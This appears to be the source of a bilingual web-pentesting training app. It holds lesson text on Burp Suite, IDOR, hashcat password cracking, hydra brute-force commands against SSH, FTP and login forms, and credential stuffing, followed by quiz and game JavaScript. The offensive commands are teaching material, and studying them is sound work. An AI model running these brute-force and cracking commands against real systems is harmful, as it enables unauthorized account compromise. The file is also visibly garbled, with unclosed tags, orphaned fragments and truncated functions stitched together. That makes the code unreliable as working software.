<pre class="code-block"><code><span class="comment"># Check CSP header</span>
curl -sI https://target.com | grep -i "content-security"
<span class="comment"># Content-Security-Policy: script-src 'self' 'unsafe-inline'</span>
<span class="comment"># 'unsafe-inline' = CSP does NOT protect against XSS!</span>

`<div class="did-you-know">💡 <strong>Did you know?</strong> Burp Suite Pro costs $449/year. Burp Suite Community (free) comes without Scanner and fast Intruder — but with full Proxy and Repeater. 80% of web pentest work is done in Repeater: capture request, modify, resend, see what happens.</div>

<div class="section-title">Burp Suite Architecture</div>
<p class="prose">Burp Suite is a proxy that sits between your browser and the internet. Your browser is configured to use 127.0.0.1:8080 as a proxy. Every HTTP/HTTPS request passes through Burp before reaching the server. Burp displays it, lets you modify it, and send it forward — or stop and analyze it. This gives you full control over all web traffic.</p>
<p class="prose">For HTTPS: Burp installs its own CA certificate in the browser. The browser trusts Burp, Burp opens and closes TLS with the browser, and opens new TLS with the server. Intentional MiTM. The CA cert must be installed in the browser before you start.</p>

<div class="section-title">The Key Modules</div>
<pre class="code-block"><code><span class="comment"># 1. Proxy — Intercept</span>
<span class="comment"># Every request stops until you click Forward</span>
<span class="comment"># You can modify any header, param, cookie</span>

<span class="comment"># 2. Repeater — send again and again</span>
<span class="comment"># Send request to Repeater (Ctrl+R)</span>
<span class="comment"># Change param: id=1 → id=2 → id=999</span>
<span class="comment"># ← see different responses</span>
<span class="comment"># This is the tool for manual manipulation of any vulnerability</span>

<span class="comment"># 3. Intruder — automated Fuzzing</span>
<span class="comment"># Mark position: username=§admin§&password=§test§</span>
<span class="comment"># Load wordlist: rockyou.txt</span>
<span class="comment"># Run — Burp sends every password from the list</span>
<span class="comment"># Check response length/status to identify success</span>

<span class="comment"># 4. Scanner (Pro) — auto-detect vulnerabilities</span>
<span class="comment"># Active scan → finds SQLi, XSS, SSRF, IDOR, etc.</span>

<div class="section-title">IDOR — Insecure Direct Object Reference</div>
<p class="prose">IDOR is a vulnerability where an API endpoint returns data by ID — without verifying that the user can access that ID. /api/user/123 returns user 123's profile. What happens if you send /api/user/124? If it returns another user's profile — that is IDOR. Repeater is the tool to test this.</p>

    The platform paid $10,000 for the bug. Fix: validate that the requesting user is a participant in the thread before granting access. IDOR is Broken Access Control — #1 in OWASP Top 10 2021.

<div class="section-title">Hashing and Password Storage</div>
<p class="prose">Passwords are not supposed to be stored as text — they are stored as a hash. When you log in, the system hashes the password you entered and compares it to the stored hash. The problem: hash functions like MD5 and SHA-1 are very fast — which is good for performance, bad for security. An attacker who stole the DB can run billions of guesses per second.</p>
<pre class="code-block"><code><span class="comment"># MD5 — fast = dangerous for passwords</span>
echo -n "password123" | md5sum
<span class="comment"># ef92b778bafe771e... ← GPU: 300B hashes/sec</span>

<span class="comment"># bcrypt — intentionally slow</span>
<span class="comment"># rounds=12: 300ms per hash</span>
<span class="comment"># brute force: only 3 hashes/sec</span>

<span class="comment"># hashcat — GPU password cracking</span>
hashcat -m 0 hash.txt rockyou.txt         <span class="comment"># MD5 + wordlist</span>
hashcat -m 3200 hash.txt rockyou.txt      <span class="comment"># bcrypt</span>
hashcat -m 1000 hash.txt rockyou.txt      <span class="comment"># NTLM (Windows)</span>
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule  <span class="comment"># with rules</span>

<span class="comment"># Rules — variations on wordlist</span>
<span class="comment"># "password" → Password, PASSWORD, passw0rd, p@ssword...</span>
<span class="comment"># Increases coverage 10,000x at no memory cost</span></code></pre>

hydra -l admin -P rockyou.txt ftp://192.168.1.100

<span class="comment"># Web form brute force</span>
hydra -l admin -P rockyou.txt   http-post-form "http://target/login:user=^USER^&pass=^PASS^:Login failed"

<span class="comment"># Rate limiting — control threads</span>
hydra -l admin -P rockyou.txt -t 4 ssh://target  <span class="comment"># 4 threads</span></code></pre>

<div class="section-title">Credential Stuffing</div>
<p class="prose">Credential Stuffing is different from brute force: instead of guessing passwords, it uses real leaked credentials. Have I Been Pwned (haveibeenpwned.com) contains over 12 billion records from breaches. If a user uses the same password on Netflix and Gmail — and Netflix was breached — the attacker tries Gmail with the same credentials.</p>

<div class="real-world-box">

    The takeaway: password reuse is deadly. One of these passwords is probably yours. Credential stuffing with this file equals immediate compromise of any account that reuses it. Fix: password manager + unique password per site + MFA.

</div>

<div class="callout callout-info" style="margin-top:32px"><strong>🔧 In Practice</strong></div>

<p class="prose">Password attacks in a pentest fall into two categories: offline cracking (you have a hash — crack it) and online brute force (login interface — try passwords). Each requires a completely different approach.</p>

<div class="section-title">Offline Hash Cracking</div>
<pre class="code-block"><code><span class="comment"># Step 1: Identify hash type</span>
hash-identifier           <span class="comment"># interactive</span>
hashid "5f4dcc3b5aa765d61d8327deb882cf99"
<span class="comment"># MD5</span>

<span class="comment"># Step 2: hashcat</span>
<span class="comment"># MD5 (-m 0)</span>
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

<span class="comment"># bcrypt (-m 3200) — very slow, use short wordlist only</span>
hashcat -m 3200 hashes.txt 100_common_passwords.txt

<span class="comment"># NTLM (Windows, -m 1000)</span>
hashcat -m 1000 hashes.txt rockyou.txt

<span class="comment"># With rules — significantly increases coverage</span>
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

<span class="comment"># See cracked results</span>
hashcat -m 0 hashes.txt --show</code></pre>

<div class="section-title">Online Brute Force — Carefully</div>
<pre class="code-block"><code><span class="comment"># Hydra — authorized targets only!</span>
<span class="comment"># SSH</span>
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://target_ip
<span class="comment"># -t 4 = 4 threads (do not raise — causes lockout!)</span>

<span class="comment"># Web login form</span>
hydra -l admin@target.com -P passwords.txt target.com   http-post-form "/login:email=^USER^&password=^PASS^:Invalid credentials"   -t 2 -W 3
<span class="comment"># -W 3 = wait 3 seconds between tries</span>

<span class="comment"># Password Spray — better than brute force</span>

<div class="section-title">Default Credentials</div>
<p class="prose">Before brute force — always try default credentials. Shodan shows tens of thousands of devices with admin/admin. Useful resource: cirt.net/passwords — a database of default credentials by vendor and device.</p>`,

function renderFill(chId, i, ex, Lc, T) {
  const total = getL(chId).length;
  const fields = ex.fields.map((f, fi) =>
    `<div class="fill-row" id="fill-row-${chId}-${i}-${fi}">
      <label class="fill-label">${f.label}</label>
      <div class="fill-input-wrap">
        <input class="fill-input" id="fill-inp-${chId}-${i}-${fi}" placeholder="${f.placeholder}"

        <span class="fill-icon" id="fill-icon-${chId}-${i}-${fi}"></span>
      </div>
    </div>`).join('');
  return `<div class="lab-card" id="labcard-${chId}-${i}">
    <div class="lab-card-hdr"><span class="lab-type-badge">${T.fill}</span><span class="lab-card-num">${i+1}/${total}</span></div>
    <div class="lab-card-q">${ex.q}</div>
    <div class="fill-fields">${fields}</div>
    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
  </div>`;
}

function fillCheck(chId, i, fi) {
  const exs = getL(chId);
  const f = exs[i].fields[fi];
  const inp = document.getElementById(`fill-inp-${chId}-${i}-${fi}`);
  const icon = document.getElementById(`fill-icon-${chId}-${i}-${fi}`);
  const row = document.getElementById(`fill-row-${chId}-${i}-${fi}`);
  if (!inp) return;
  const val = inp.value.trim().toLowerCase();
  const alts = (f.alt || []).map(a => a.toLowerCase());
  const ok = val === f.answer.toLowerCase() || alts.includes(val);
  row.className = 'fill-row' + (val.length===0?'': ok?' fill-correct':' fill-wrong');
  icon.textContent = val.length===0?'': ok?'✓':'';
  const allOk = exs[i].fields.every((ff, ffi) => {
    const v = (document.getElementById(`fill-inp-${chId}-${i}-${ffi}`)?.value||'').trim().toLowerCase();
    return v === ff.answer.toLowerCase() || (ff.alt||[]).map(a=>a.toLowerCase()).includes(v);
  });
  if (allOk) markLabDone(chId, i);
}

      ${shuffled.map(item=>`<button class="classify-chip" id="chip-${chId}-${i}-${item.id}" onclick="classifySelect(${chId},${i},'${item.id}')">${esc(item.text)}</button>`).join('')}

}

// ===== HELPERS =====
function L() { return currentLang==='he' ? C.he : C.en; }

function getQ(i) {
  const key = currentLang+'-'+i;
  if (!_sqCache[key]) {
    const raw = (currentLang==='en' ? (QUIZZES_EN[i]||QUIZZES[i]) : QUIZZES[i]) || QUIZZES[0];
    _sqCache[key] = raw.map(q => shuffleOptions(q));
  }
  return _sqCache[key];
}
function getL(i) { return (currentLang==='en' ? (ILABS_EN[i]||ILABS[i]) : ILABS[i]) || ILABS[0]; }
function getG(i) {
  const key = currentLang+'-g-'+i;
  if (!_sgCache[key]) {
    const raw = (currentLang==='en' ? (GAME_QS_EN[i]||GAME_QS[i]) : GAME_QS[i]) || GAME_QS[0];
    _sgCache[key] = raw.map(q => shuffleOptions(q));
  }
  return _sgCache[key];
}
const _sqCache = {}, _sgCache = {};

// ===== NORMALIZE + SHUFFLE (length bias fix) =====
function normalizeOptions(q) {
  const lens = q.o.map(o => o.length);
  const wrongLens = lens.filter((_, i) => i !== q.a);
  const maxWrong = Math.max(...wrongLens);
  const cap = maxWrong;
  const newOpts = q.o.map(o => {
    if (o.length <= cap) return o;
    let t = o.slice(0, cap);
    const ls = t.lastIndexOf(' ');
    if (ls > cap * 0.5) t = t.slice(0, ls);
    return t;
  });
  return { ...q, o: newOpts };
}
function shuffleOptions(q) {
  const norm = normalizeOptions(q);
  const idx = [0,1,2,3];
  for (let i = idx.length-1; i > 0; i--) {
    const j = Math.floor(Math.random()*(i+1));
    [idx[i],idx[j]] = [idx[j],idx[i]];
  }
  return { ...norm, o: idx.map(i=>norm.o[i]), a: idx.indexOf(norm.a) };
}

        <button class="btn btn-primary" id="qbtn-lab-${chId}" onclick="showTab(${chId},'lab')"></button>
      </div>
    </div>

      <button class="btn btn-ghost" id="qprev-${chId}" onclick="quizNav(${chId},-1)"></button>
      <button class="btn btn-primary" id="qnext-${chId}" onclick="quizNav(${chId},1)"></button>
    </div>`;
  refreshQuiz(chId);
}

function refreshQuiz(chId) {
  const st=state.quiz[chId]; if(!st) return;
  const qs=getQ(chId); const Lc=L();
  qs.forEach((_,i)=>{
    const card=document.getElementById(`qcard-${chId}-${i}`);
    if(card) card.classList.toggle('active',i===st.qi);
    const pip=document.getElementById(`qpip-${chId}-${i}`);
    if(pip) pip.className='quiz-pip'+(i<st.qi||st.done?' done':i===st.qi?' cur':'');
    const meta=document.getElementById(`qmeta-${chId}-${i}`);
    if(meta) meta.textContent=`${Lc.question} ${i+1} ${Lc.of} ${qs.length}`;
    qs[i].o.forEach((_,oi)=>{
      const ltr=document.getElementById(`qltr-${chId}-${i}-${oi}`);
      if(ltr) ltr.textContent=Lc.optLetters[oi];
    });
    const explbl=document.getElementById(`qexplbl-${chId}-${i}`);
    if(explbl) explbl.textContent=Lc.quizExplain;
  });
  const prev=document.getElementById(`qprev-${chId}`);
  const next=document.getElementById(`qnext-${chId}`);
  if(document.getElementById(`qbtn-reset-${chId}`)) document.getElementById(`qbtn-reset-${chId}`).textContent=Lc.quizAgain;
  if(document.getElementById(`qbtn-lab-${chId}`)) document.getElementById(`qbtn-lab-${chId}`).textContent=Lc.quizToLab;
  if(prev){prev.textContent=Lc.quizPrev;prev.disabled=st.qi===0;}
  if(next){
    const ans=st.ans[st.qi]!==undefined;
    if(st.qi<qs.length-1){next.textContent=Lc.quizNext;next.disabled=!ans;next.onclick=()=>quizNav(chId,1);}
    else{next.textContent=Lc.quizSubmit;next.disabled=Object.keys(st.ans).length<qs.length;next.onclick=()=>quizSubmit(chId);}
  }
}

function quizPick(chId,qi,oi){
  const st=state.quiz[chId];if(!st||st.done)return;
  st.ans[qi]=oi;
  getQ(chId)[qi].o.forEach((_,o)=>{
    const btn=document.getElementById(`qopt-${chId}-${qi}-${o}`);
    if(btn) btn.classList.toggle('selected',o===oi);
  });
  refreshQuiz(chId);
}

function quizNav(chId,dir){
  const st=state.quiz[chId];if(!st)return;
  st.qi=Math.max(0,Math.min(getQ(chId).length-1,st.qi+dir));
  refreshQuiz(chId);
}

function quizSubmit(chId){
  const st=state.quiz[chId];if(!st)return;
  const qs=getQ(chId);const Lc=L();
  let score=0;
  qs.forEach((q,i)=>{
    const chosen=st.ans[i];const correct=q.a;
    q.o.forEach((_,oi)=>{
      const btn=document.getElementById(`qopt-${chId}-${i}-${oi}`);
      if(!btn)return;
      btn.classList.add('disabled');
      if(oi===correct)btn.classList.add('correct');
      else if(oi===chosen)btn.classList.add('wrong');
      btn.classList.remove('selected');
    });
    const exp=document.getElementById(`qexp-${chId}-${i}`);
    if(exp)exp.style.display='block';
    if(chosen===correct)score++;
  });
  st.done=true;st.score=score;
  const stars=score>=5?3:score>=4?2:score>=3?1:0;
  state.stars[chId]=Math.max(state.stars[chId]||0,stars);
  addXP(score*10);updateStars(chId);
  document.getElementById(`qnav-${chId}`).style.display='none';
  const res=document.getElementById(`qres-${chId}`);
  res.classList.add('visible');
  document.getElementById(`qscore-${chId}`).textContent=`${score}/${qs.length}`;
  const emojis=['😔','😅','🙂','😊','🎉','🏆'];
  document.getElementById(`qemoji-${chId}`).textContent=emojis[score]||'🎉';
  document.getElementById(`qlabel-${chId}`).textContent=Lc.resultLabels[score]||'';
  document.getElementById(`qstars-${chId}`).textContent='⭐'.repeat(stars)+'☆'.repeat(3-stars);
  qs.forEach((_,i)=>{const c=document.getElementById(`qcard-${chId}-${i}`);if(c)c.classList.add('active');});
}

function quizReset(chId){
  state.quiz[chId]=null;
  const el=document.getElementById('quiz-'+chId);
  if(el){el.innerHTML='';delete el.dataset.rendered;}
  delete _sqCache[currentLang+'-'+chId];

          <div class="game-rule">🏆 <span>${Lc.gameXP}</span></div>
        </div>
        <button class="btn btn-primary" style="font-size:13px;padding:11px 32px" onclick="gameStart(${chId})">${Lc.gameStart}</button>
        ${buildLB(chId)}
      </div>`;
  } else if(gs.phase==='playing'){
    renderGamePlay(chId);
  } else {
    renderGameOver(chId);
  }
}

function gameStart(chId){
  const gqs=getG(chId);
  state.game[chId]={phase:'playing',qs:[...gqs].sort(()=>Math.random()-.5),qi:0,score:0,time:60,answered:false};
  renderGame(chId);startTimer(chId);
}

function renderGamePlay(chId){
  const el=document.getElementById('game-'+chId);
  const gs=state.game[chId];const Lc=L();
  if(!gs||gs.phase!=='playing')return;
  const q=gs.qs[gs.qi];
  if(!q){gameOver(chId);return;}
  el.innerHTML=`
    <div class="game-hud">
      <div class="hud-timer${gs.time<=10?' urgent':''}" id="gtimer-${chId}">${gs.time}</div>
      <div class="hud-qnum">${gs.qi+1}/${gs.qs.length}</div>
      <div class="hud-score">⭐ ${gs.score}</div>
    </div>
    <div class="game-q">${q.q}</div>
    <div class="game-opts">
      ${q.o.map((opt,i)=>`<button class="game-opt" id="gopt-${chId}-${i}" onclick="gameAnswer(${chId},${i})">${opt}</button>`).join('')}
    </div>
    <div class="game-fb" id="gfb-${chId}"></div>`;
}

function startTimer(chId){
  clearInterval(gameTimer);
  gameTimer=setInterval(()=>{
    const gs=state.game[chId];
    if(!gs||gs.phase!=='playing'){clearInterval(gameTimer);return;}
    gs.time--;
    const t=document.getElementById(`gtimer-${chId}`);
    if(t){t.textContent=gs.time;t.className='hud-timer'+(gs.time<=10?' urgent':'');}
    if(gs.time<=0){clearInterval(gameTimer);gameOver(chId);}
  },1000);
}

function gameAnswer(chId,chosen){
  const gs=state.game[chId];if(!gs||gs.answered)return;
  gs.answered=true;
  const q=gs.qs[gs.qi];const ok=q.a===chosen;
  document.querySelectorAll(`#game-${chId} .game-opt`).forEach(b=>b.classList.add('disabled'));
  document.getElementById(`gopt-${chId}-${chosen}`)?.classList.add(ok?'correct':'wrong');
  if(!ok)document.getElementById(`gopt-${chId}-${q.a}`)?.classList.add('correct');
  const fb=document.getElementById(`gfb-${chId}`);
  if(fb){fb.textContent=ok?'+10 ✓':'✗';fb.className='game-fb '+(ok?'ok':'bad');}
  if(ok){gs.score+=10;addXP(10);}
  setTimeout(()=>{
    gs.qi++;gs.answered=false;
    if(gs.qi>=gs.qs.length){gameOver(chId);return;}
    renderGamePlay(chId);startTimer(chId);
  },850);
}

function gameOver(chId){
  clearInterval(gameTimer);
  const gs=state.game[chId];if(!gs)return;
  gs.phase='over';const Lc=L();
  try{
    let lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');
    lb.push({name:Lc.playerName,score:gs.score,ts:Date.now()});
    lb.sort((a,b)=>b.score-a.score);lb=lb.slice(0,5);
    localStorage.setItem(`cyber-${chId}`,JSON.stringify(lb));
  }catch(e){}
  const total=gs.qs.length*10;const pct=Math.round((gs.score/total)*100);
  const medal=gs.score>=total*.8?'🏆':gs.score>=total*.5?'🥈':'🥉';
  document.getElementById('game-'+chId).innerHTML=`
    <div class="game-over-card">
      <div style="font-size:50px;margin-bottom:8px">${medal}</div>
      <div class="game-over-score">${gs.score}</div>
      <div class="game-over-title">${Lc.points} · ${pct}${Lc.pct}</div>
      ${buildLB(chId)}
      <div style="display:flex;gap:8px;justify-content:center;margin-top:16px">
        <button class="btn btn-ghost" onclick="gameRestart(${chId})">${Lc.gameAgain}</button>
        <button class="btn btn-primary" onclick="showTab(${chId},'cheat')">${Lc.gameToCheat}</button>
      </div>
    </div>`;
}

function gameRestart(chId){
  state.game[chId]={phase:'idle'};
  const el=document.getElementById('game-'+chId);
  if(el)el.innerHTML='';
  delete _sgCache[currentLang+'-g-'+chId];
  renderGame(chId);
}

function buildLB(chId){
  let lb=[];
  try{lb=JSON.parse(localStorage.getItem(`cyber-${chId}`)||'[]');}catch(e){}
  if(!lb.length)return'';
  const medals=['🥇','🥈','🥉','4','5'];
  const cls=['gold','silver','bronze','normal','normal'];
  const Lc=L();
  return`<div class="leaderboard"><div class="lb-title">${Lc.lbTitle}</div>${lb.map((e,i)=>`
    <div class="lb-row ${cls[i]}">
      <span class="lb-rank">${medals[i]}</span>
      <span class="lb-name">${e.name||Lc.unknownPlayer}</span>
      <span class="lb-pts">${e.score} ${Lc.points}</span>
    </div>`).join('')}</div>`;
}

// ===== XP & STARS =====
function addXP(n){
  state.xp+=n;
  const max=TOTAL_CHAPTERS*(5*10+4*5+8*10);
  const pct=Math.min(100,(state.xp/max)*100);
  document.getElementById('xpBar').style.width=pct+'%';
  document.getElementById('xpLabel').textContent=state.xp+' XP';
}

function updateStars(chId){
  const el=document.getElementById('stars-'+chId);
  if(!el)return;
  const s=state.stars[chId]||0;
  el.textContent='⭐'.repeat(s)+'☆'.repeat(3-s);
}

</script></body></html>
